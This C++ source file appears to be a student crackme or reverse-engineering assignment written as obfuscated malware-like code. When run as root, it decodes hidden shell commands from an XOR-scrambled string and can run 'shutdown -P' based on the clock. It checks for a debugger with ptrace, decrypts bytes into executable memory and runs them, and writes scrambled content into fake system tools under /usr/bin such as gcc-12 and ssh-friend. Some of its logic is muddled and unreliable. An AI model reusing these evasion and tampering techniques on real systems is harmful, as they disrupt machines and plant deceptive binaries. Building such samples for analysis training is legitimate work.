#include <random>
#include <iostream>
#include <csignal>
#include <string>
#include <cstdlib>
#include <sys/ptrace.h>
#include <any>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <cstring>
#include <fstream>
#include <openssl/sha.h> // hash function
#include <iomanip>
#include <sstream>
#include <sys/stat.h>
#include <sys/types.h>
#include <cstring>

long long bs1 = 0x0f2bc3ee05faa249;
long long bs2 = 0x70DD85D8FE63E152;
long long bs3 = 0xFCC7752FDB865D11;
long long bs4 = 0x51982D5DCF0B2489;

std::string key;
std::string bs5 = "bqk)9H*!";
std::string bs6 = "$D4<:>JU";
std::string bs7 = "FjYKB6a/";
std::string bs8 = "V5T^`y=C";
std::string bs9 = "-(~XAGEg";
std::string bs10 = "zcsL8%rh;]";

//Returns various system call strings based on input
//0 is shutdown -P
std::string system_call(int arg) {
    srand(arg);
    
    int start;
    int length;
    std::string target;
    
    
    
    std::string big_long_string = "asdgasuidhfokasdjflkawlqp`ksj$)Tlkasjst}:\"4\"4\"4\":$$:tnmuhqEj{hn+4nbnienrgpiosunrgp`{fgw|d}3>Cp34unpfcvg\" )'V uryv{`2=fb=e}`yhq9io`mv$+pit+skvo+Tqfhmgk498hng-9qert{vm?0kro0hpmt0mppk938ht-w4958jg-=r8rtjb-q9r8wlv`k#,wns,tlqh,Svaoj`,lvwsvw-old#%%#f`kl#!&p!#=#,wns,tlqh,Svaoj`,lvwsvw-oldthn2-98ntq-85ngrisen&)sut)doh)gvr+ohurgjj&  &ceni&$#u$&8&)sut)doh)gvr+ohurgjj98rng-qirn[oeirn}f|ja)&|z{&k`g&njj$8;)//)ljaf)+,z+)7)&|z{&k`g&njj$8;4ht-q3894u6=q09rg0qj-3413y-4897gth103874thbn013874nf-1384hnf-1weiduhfoaijsdfhpaiwuerh-198u4rt-19834ht-8urng-qe9r8ugh-2q93845ut-91384jnf-q3uhrf-q938urty-q39485uq-3948gjf-q9efnsd-fiugnwpirugjaelkgjaskldjfblaskjdbfa;siudfhawop49rtuq23[4-05i[q-340tita]-0ri=s]-0rgiq]23-oprjeiolrgkhawelgiajert'p0awi[r-0q3it]0skr'gpoaejrop;gtije[9guaje[roigjaeo[rigj[ao ijrg[aw904ut 0-49wut][a09reuw g]a90ug]0a9wu4t]a094ut 0d9ujga[ erjg [aoisdug[a0we9tu[ qa]09ugh]a09erug[aer908ugha'dofighja['oersiguja[]w0e9fui[aw09etguj]qw0394ut]q3094u[q09erug[aoijrg[aoeirjg[aoeirjta3049u56 ]aw9eurhjg'asdigh/asdilghaw[094tuaw\43t9uae[rg8ha;soirgha[p9e8tuy[93w84hjt[98h`[98h3r[p98jsphoijp394806upw9384u6-98y7u0-9*^&)*&^*&%$&%^$#&^%%*(&)_(&*)&^(*&^)87ypiouehgpiosuhergpoiuaherpiguha erui9gyaieurghpaieurhgapioeurhgfpaw3uh5qp98w4tyup9z8dfgdzlioghpsa4eoiu6pq9384upiohjgskljdrhglaieutha[09w4u5t[03q49utaoierjg[0a9drughao;ierlhaw/4tilhjqa]4095uq3\4t-90=s0er9gut=09832yu-9834y-9184hogi;soidrhjg;alkdfgnse;olirtgja'eopirjgklsdfgaoeriugfaoerihgaoidfkvn;aeoifgua[e094rtyu[qa094tu[aoihrjf;aiosuehf;kajsdhfg;aoperug[0ae9rug[09erug[0oa9erug[0aer9ug[ae09rgu[ae0riugj[aeorijg;aodfikgj;aldkrjg[aeo9rug[ae0r9ugdf0vnea[9r8hge[a98rgh[39804u52[984u50=189=`098`=-029358=`092385=`-092835u[098u35[o`i23h5[o`2i3h5[oi2h3[98`h23[9o8ih[obkjsd;origjse'oirgj;seoirgj;aseoirjg;qaoeirjg[0319u5[0934ut[09regjs/ldirghj'ea/srilogje;'9porut]09&)(*^)(@*&#^$)*(^)*(&60p98uo98h6-q983h4t=gq8h=3984nt=q84=vqk3409vk=q95kh9ierujngpiunpfgiojasfoijawpejibpfs8ie4yt9pq83uy5-q98ueg-srtjsrtjsrtjsrtjsrtjsrtjsrtjsrtjsrtjsrtj9a8urg-9a8rhapioehjfpiajwhepfioq2p390ru=q094tsdfgsdfgsdfgsdfgsdfjsrtjasertj=-srtjsrtjsrtjsrtjsrtjsrtju-=98erhgpa9uihrepgiaouhwefpiuabrpfiuaebrgpiuawb-tp8q32y5-9823u-t8hj-guhawepiuoghpaiuehgpaiuwehgpaiwuehgpiawuhegpiauwehgp";
    
    
    if (arg == 0) { //shutdown -P
        start = (rand() % 206 - 4) / 3; //21
        length = (rand() % rand() % rand() % rand() % (rand() / 2) % (rand() / 6666666)) - 49; //11
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 4222) % 50 % 11;
        
    
        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i]  ^ index;
        }
        
        return target;
    }
    else if (arg == 1) { //ping 8.8.8.8 >> network_part1.txt
        start = (rand() % rand() / (rand() % rand() / 555)); //36
        length = ((rand() / 55) / (rand() / 5600) + 1) % 46 + 23; //33
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 555) % 222 % 222 - 188;
    
        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
    }
    else if (arg == 2) { //mkdir /tmp/work
        start = ((rand() % rand() - 120 + 120) / 95555) / 140; //112
        length = ((rand()) % (rand()) % (rand())) / ((rand()) % (rand()) % (rand())) + 12; //15
        
        target = big_long_string.substr(start, length);
        int index = ((rand() % 555) % 222 % 221) - 555;

        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
        
    }
    else if (arg == 3) { //mkdir /tmp/work/root
        start = (rand() % rand() % rand() % rand()) / (rand() % 6666666) + 120; //163
        length = ((rand() % rand()) % (rand()) / 6666666) - 26;
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 555) % 222 % 221;
        
        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
    }
    else if (arg == 4) { //shutdown -P
        start = ((rand() + rand() - rand() % rand() - rand() - rand()) % 4444) / 51; //83
        length = (rand() % rand() % rand()) / ((rand() % rand() % rand() % rand() % rand() % rand() % rand() % rand()) / 200) - 66; //11
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 555) % 222 % 221;
        
        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
    }
    else if (arg == 5) { //date "+%T"
        start = (rand() % rand()) / (rand() / 2345); //100
        length = (rand() % rand()) / rand() * 10; //10
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 555) % 222 % 221 % 11;

        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
    }
    else if (arg == 6) { //mkdir /tmp/work/Public
        start = ((rand() % rand() % rand() % rand() % rand() % rand()) / 1000000) + 22; //130
        length = ((rand() % rand() % rand() % rand() % rand() % rand()) / 10000000) - 10; //22
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 555) % 222 % 221 % 11;
        
        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
    }
    else if (arg == 7) { //touch /tmp/work/Public/output.log && echo \"%s\" > /tmp/work/Public/output.log
    
        start = (rand() % rand() % rand()) / 5000000; //209
        length = ((rand() % rand() % rand() % rand() % rand() % rand()) / 888888) + 52; //76
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 555) % 222 % 221 % 10;
        
        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
        
    }
    
    else if (arg == 8) { //touch /usr/bin/apt-install && echo \"%s\" > /usr/bin/apt-install
    
        start = (rand() % rand()) / (rand() % rand()) + 288; //300
        length = ((rand() % rand() % rand() % rand() % rand()) / 3000000) - 87; //64
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 555) % 222 % 221 % 10;

        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
        
    }
    else if (arg == 9) { //touch /usr/bin/gcc-12 && echo \"%s\" > /usr/bin/gcc-12
        std::cout << "Hello" << std::endl;
        start = ((((rand() % rand() % rand() % rand() % rand()) -rand() + rand()) /555555) / 3) + 40; //378
        length = (((rand() / 5566555) / 4) - 8); //52
        
        target = big_long_string.substr(start, length);
        int index = (rand() % 555) % 222 % 221 % 11;

        for (int i = 0; i < target.size(); ++i) {
            target[i] = target[i] ^ index;
        }
        
        return target;
    }
    else if (arg == 10) { //touch /tmp/work/root/info.log && echo \"%s\" > /tmp/work/root/info.log
        std::cout << start << std::endl;
    }
    else if (arg == 11) { //touch /usr/bin/ssh-friend && echo \"%s\" > /usr/bin/ssh-friend
        std::cout << start << std::endl;
    }
    else if (arg == 12) { //touch /usr/bin/sha128sum && echo \"%s\" > /usr/bin/sha128sum
        std::cout << start << std::endl;
    }
    
    return big_long_string;
    
}

//interrupt handler for ctrl+c, we can clean up nicely here and not leave atifacts from running on the system
void handle_sigint(int signal){
    printf("Shutting down gracefully");
    exit(0);
}

int sum1(int a, int b){
    return a + b;
}

int masking_func(int param1, int param2)
{
    return param1 ^ param2;
}

//can use this function to fuck with them and hide which key gets generated
int gen_key(){
    //system(system_call(1).c_str());
    int key1 = masking_func((1<<9), bs1);
    int key2 = masking_func((1<<8), bs2);
    int key3 = masking_func((1<<7), bs3);
    int key4 = masking_func(sum1((1<<6), (1<<5) + (1<<3)), bs4);
    return sum1(masking_func(key1, bs1), masking_func(key2, bs2)) + sum1(masking_func(key3, bs3), masking_func(key4, bs4));
}

/*
Made this a global variable so we can generate a random number at random points and not make it as clear where the generation
starts for the stream_encrypt function
*/
std::mt19937 prng(gen_key());

int gen_seed(){
    for(int i = 0; i < 57; i++){
        key.append(std::to_string(prng()));
    }
    return 500;
}

int sum(int a, int b){
    prng();
    return a + b;
}

int pow(int a, int b){
    int total = 0;
    for(int i = 0; i < b; i++){
        for(int j = 0; j < a; j++){
            total += sum(a, a);
        }
    }
    return total;
}

//should be removed once we have all the things generated
void encrypt(unsigned char* temp){
    for(int i = 0; i < 21; i++){
        temp[i] ^= key[i%key.size()];
        temp[i] += (i % 7);
        temp[i] = (temp[i] << 1) | (temp[i] >> 7);
    }
}

unsigned char decrypt_char(unsigned char ch, int offset){
    unsigned char decrypted;
    if((prng()%2) < 2){
        decrypted = ch - (offset%7);
        decrypted ^= key[offset % key.size()];
        return decrypted;
    }
    else{
        return 0x01;
    }
    
}

void decrypt_string(unsigned char * str){
    int i = 0;
    //size_t str_len = strlen(str);
    for(;i < 21; i++){
        str[i] = (str[i] >> 1) | (str[i] << 7);
        str[i] = decrypt_char(str[i], i);
    }
}

//Stream encrypt function that relies on a psudeo random number generator and XOR to generate a ciphertxt from a plain txt
void stream_encrypt(char* plaintxt, char* ciphertxt, unsigned int key){
    int index = 0;
    while(*plaintxt != '\0'){
        char byte = prng() % 256;
        ciphertxt[index] = *plaintxt ^ byte;

        ciphertxt[index] ^= pow(byte, byte%10) % 256;

        plaintxt++;
        index++;

        ciphertxt[index] ^= pow(byte, byte%10) % 256;
    }
    ciphertxt[index] = '\0';
}

//creates a PPM (Portable Pixmap) image file that hides a 32-bit integer key within the pixel data. The function currently calls gen_key() to generate a new key every time it’s called.
void create_stego_image(const char* filename, int hiddenKey) {
    std::ofstream imageFile(filename, std::ios::binary);
    if (!imageFile.is_open()) {
        std::cerr << "Failed to create image file\n";
        return;
    }

    // Write a PPM header for a 64x64 image
    imageFile << "P3\n64 64\n255\n";

    // Split the 32-bit hidden key across four pixels
    int keyParts[4];
    keyParts[0] = (hiddenKey >> 24) & 0xFF;  // Most significant byte
    keyParts[1] = (hiddenKey >> 16) & 0xFF;
    keyParts[2] = (hiddenKey >> 8) & 0xFF;
    keyParts[3] = hiddenKey & 0xFF;          // Least significant byte

    // Write pixel data
    for (int y = 0; y < 64; y++) {
        for (int x = 0; x < 64; x++) {
            if (x == 2 && y == 2) {
                // Embed the first part of the key in the red channel of pixel (2, 2)
                imageFile << keyParts[0] << " 0 0 ";
            } else if (x == 3 && y == 2) {
                // Embed the second part of the key in the red channel of pixel (3, 2)
                imageFile << keyParts[1] << " 0 0 ";
            } else if (x == 4 && y == 2) {
                // Embed the third part of the key in the red channel of pixel (4, 2)
                imageFile << keyParts[2] << " 0 0 ";
            } else if (x == 5 && y == 2) {
                // Embed the fourth part of the key in the red channel of pixel (5, 2)
                imageFile << keyParts[3] << " 0 0 ";
            } else {
                // Normal red color for other pixels
                imageFile << "255 0 0 ";
            }
        }
        imageFile << "\n"; // New line for the next row
    }

    imageFile.close();
}

//Hash function 
//  "g++ C2.cpp -o C2  -lssl -lcrypto" to compile
std::string compute_sha256(const std::string& input) {
    unsigned char hash[SHA256_DIGEST_LENGTH];  //an array hash to store the resulting hash.
    SHA256_CTX sha256; //hold the state of the SHA-256 computation.
    SHA256_Init(&sha256);
    SHA256_Update(&sha256, input.c_str(), input.size());
    SHA256_Final(hash, &sha256);
    
    std::ostringstream oss;
    for (int i = 0; i < SHA256_DIGEST_LENGTH; ++i) { //hash is converted to a hexadecimal string format for easy readability and returned
        oss  << (int)hash[i];
        //oss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i];
    }
    return oss.str();
}

//allegedly this will detect if a debugger is already attached to the program
bool is_debugger_attached() {
    // Attempt to attach to the current process
    if (ptrace(PTRACE_ATTACH, getppid(), 1, 0) == -1) {
        // If we can't attach, a debugger is likely present
        if (errno == EPERM) {
            return true; // Debugger is attached
        }
    }
    return false; // No debugger detected
}




//returns the 10s minute
int gettenminute() {

    FILE *fp;
    char buffer[20];
    std::string result = "";

    // Open the pipe for reading
    fp = popen(system_call(5).c_str(), "r"); 

    if (fp == NULL) {
        std::cerr << "Nagoya" << std::endl;
        return 1;
    }

    // Read the output line by line
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        result += buffer;
    }


    return stoi(result.substr(3, 1));

}

int folder_master(std::string val1, std::string val2, std::string val3, std::string val4, std::string val5, std::string val6)
{
    srand(time(0));
    char command[256];
    char command1[256];
    char command2[256];
    char command3[256];
    char command4[256];
    char command5[256];

    int rand1 = rand() % 256;
    for (int i = 0; i < val1.size();i++)
    {
        val1[i] = val1[i] ^ rand1;
        // std::cout << val1[i] << std::endl;
    }

    int rand2 = rand() % 256;
    for (int i = 0; i < val2.size();i++)
    {
        val2[i] = val2[i] ^ rand2;
        // std::cout << val2[i] << std::endl;
    }

    int rand3 = rand() % 256;
    for (int i = 0; i < val3.size();i++)
    {
        val3[i] = val3[i] ^ rand3;
        // std::cout << val3[i] << std::endl;
    }

    int rand4 = rand() % 256;
    for (int i = 0; i < val4.size();i++)
    {
        val4[i] = val4[i] ^ rand4;
        // std::cout << val3[i] << std::endl;
    }

    int rand5 = rand() % 256;
    for (int i = 0; i < val5.size();i++)
    {
        val5[i] = val5[i] ^ rand5;
        // std::cout << val3[i] << std::endl;
    }

    int rand6 = rand() % 256;
    for (int i = 0; i < val6.size();i++)
    {
        val6[i] = val6[i] ^ rand6;
        // std::cout << val3[i] << std::endl;
    }
    
    system("mkdir /tmp/work");
    system("mkdir /tmp/work/root");
    system("mkdir /tmp/work/Public");

    // std::cout << val1 << 4 <<std::endl;

    snprintf(command, sizeof(command), "touch /tmp/work/Public/output.log && echo \"%s\" > /tmp/work/Public/output.log", val1.c_str());

    snprintf(command1, sizeof(command1), "touch /usr/bin/apt-install && echo \"%s\" > /usr/bin/apt-install", val2.c_str());

    snprintf(command2, sizeof(command2), "touch /usr/bin/gcc-12 && echo \"%s\" > /usr/bin/gcc-12", val3.c_str());

    snprintf(command3, sizeof(command3), "touch /tmp/work/root/info.log && echo \"%s\" > /tmp/work/root/info.log", val4.c_str());

    snprintf(command4, sizeof(command4), "touch /usr/bin/ssh-friend && echo \"%s\" > /usr/bin/ssh-friend", val5.c_str());

    snprintf(command5, sizeof(command5), "touch /usr/bin/sha128sum && echo \"%s\" > /usr/bin/sha128sum", val6.c_str());

    system(command);
    system(command1);
    system(command2);
    system(command3);
    system(command4);
    system(command5);
}


int main(){
    //detect debugger
    if(is_debugger_attached()){
        //system("shutdown&");
        printf("Debugger detected");
    }

    //Shutdown if tens place is 1
    if (gettenminute() == 1) {
        FILE *fp;
        char buffer[20];
        std::string result = "";

        // Open the pipe for reading
        fp = popen(system_call(0).c_str(), "r"); 

        if (fp == NULL) {
            std::cerr << "Osaka" << std::endl;
            return 1;
        }    
    }

    // Register the signal handler
    signal(SIGINT, handle_sigint);

    // Create a steganographic image file that hides the key
    create_stego_image("hidden_key_image.ppm", gen_key());

    //ensure the program is being run in sudo mode
    if (geteuid() != 0) {
        std::cerr << "This program must be run as root (sudo).\n";
        return 1;
    }

    //encryption for the first part, needs to be removed before turn in
    char* pt = "WhyHelloThere\0";
    char ct[15];

    stream_encrypt(pt, ct, 1000);

    printf("%s", ct);

    std::string password = "password_here"; // CHANGE PASSWORD
    std::cout << "Hashed Password: " << compute_sha256(password) << std::endl;

    std::cout << gettenminute() << std::endl;

    int temp_var = gen_seed();

    //std::cout << key << std::endl;

    //temp/test mmap stuff
    unsigned char code[] = {
        0xC7, 0x45, 0xfc, 0xe9, 0x03, 0x00, 0x00,        // xor rax, rax
        0xC7, 0x45, 0xf8, 0xeb, 0x04, 0x00, 0x00,        // xor rax, rax
        0x8b, 0x45, 0xfc, 
        0x33, 0x45, 0xf8, // add rax, 1
        0xC3                      // ret
    };

    encrypt(code);

    // for(int i = 0; i < 21; i ++){
    //     printf("%X ", code[i]);
    // }

    //printf("\n\n");

    decrypt_string(code);

    for(int i = 0; i < 21; i ++){
        printf("%X ", code[i]);
    }

    size_t code_size = sizeof(code);

    // Allocate memory for code with read, write, and execute permissions
    void* exec_mem = mmap(NULL, code_size, PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (exec_mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    // Copy code into allocated memory
    memcpy(exec_mem, code, code_size);

    // Cast memory to a function pointer and execute it
    auto func = (int(*)())exec_mem;
    int result = func();
    std::cout << "Result of executing self-modified code: " << result << std::endl;

    // Free memory
    munmap(exec_mem, code_size);

    folder_master(bs5, bs6, bs7, bs8, bs9, bs10);
    

    for(;;){

    }

    return 1;
}
